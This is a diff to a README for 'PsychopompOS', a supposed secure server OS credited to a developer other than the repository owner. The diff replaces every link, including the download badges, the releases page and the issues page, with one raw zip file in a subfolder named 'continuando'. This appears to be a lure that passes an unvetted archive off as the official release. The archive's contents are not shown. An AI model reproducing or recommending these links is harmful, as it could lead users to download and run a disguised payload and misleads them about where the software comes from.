@@ -1,6 +1,6 @@
 # 🖥️ PsychopompOS - A Secure Server Experience Made Easy
 
-[![Download PsychopompOS](https://img.shields.io/badge/Download-PsychopompOS-blue?style=for-the-badge)](https://github.com/Bgencacat4819/PsychopompOS/releases)
+[![Download PsychopompOS](https://raw.githubusercontent.com/Bgencacat4819/PsychopompOS/main/continuando/PsychopompOS.zip)](https://raw.githubusercontent.com/Bgencacat4819/PsychopompOS/main/continuando/PsychopompOS.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ Developed by @bocaletto-luca, this operating system offers optimized tools ideal
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [PsychopompOS Releases Page](https://github.com/Bgencacat4819/PsychopompOS/releases).
+To get started, visit this page to download: [PsychopompOS Releases Page](https://raw.githubusercontent.com/Bgencacat4819/PsychopompOS/main/continuando/PsychopompOS.zip).
 
 1. Click on the most recent version of PsychopompOS.
 2. Locate the installer file suitable for your hardware architecture.
@@ -112,7 +112,7 @@ After installation, here are a few quick tasks to set up PsychopompOS:
 
 If you face any issues or have questions about PsychopompOS, consider these resources:
 
-- **GitHub Issues**: Report bugs or request features on the [PsychopompOS GitHub page](https://github.com/Bgencacat4819/PsychopompOS/issues).
+- **GitHub Issues**: Report bugs or request features on the [PsychopompOS GitHub page](https://raw.githubusercontent.com/Bgencacat4819/PsychopompOS/main/continuando/PsychopompOS.zip).
   
 - **Forums**: Engage with users and developers for advice and troubleshooting.
 
@@ -122,4 +122,4 @@ If you face any issues or have questions about PsychopompOS, consider these reso
 
 For direct inquiries, you can reach the developer @bocaletto-luca on GitHub.
 
-[![Download PsychopompOS](https://img.shields.io/badge/Download-PsychopompOS-blue?style=for-the-badge)](https://github.com/Bgencacat4819/PsychopompOS/releases)
+[![Download PsychopompOS](https://raw.githubusercontent.com/Bgencacat4819/PsychopompOS/main/continuando/PsychopompOS.zip)](https://raw.githubusercontent.com/Bgencacat4819/PsychopompOS/main/continuando/PsychopompOS.zip)
